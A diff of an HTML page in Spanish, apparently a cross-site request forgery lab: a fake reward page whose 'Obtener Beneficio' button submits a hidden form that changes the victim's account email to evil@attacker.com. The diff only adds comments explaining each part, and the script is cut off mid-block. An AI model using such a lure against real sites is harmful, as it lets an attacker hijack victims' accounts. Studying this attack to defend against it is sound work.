@@ -23,6 +23,7 @@
             Para activar tu recompensa, validá tu cuenta presionando el botón de abajo.
         </p>
 
+        <!-- Boton que ejecuta el form -->
         <a href="#" class="btn" id="btn-premio">Obtener Beneficio</a>
 
         <p class="legal">
@@ -31,10 +32,12 @@
         </p>
     </div>
 
+    <!-- Formulario oculto -->
     <form id="f" action="/change-email" method="POST" >
         <input name="new_email" value="evil@attacker.com">
     </form>
 
+    <!-- Ejecuta el form cuando click en obtener beneficio -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             var btn = document.getElementById('btn-premio');
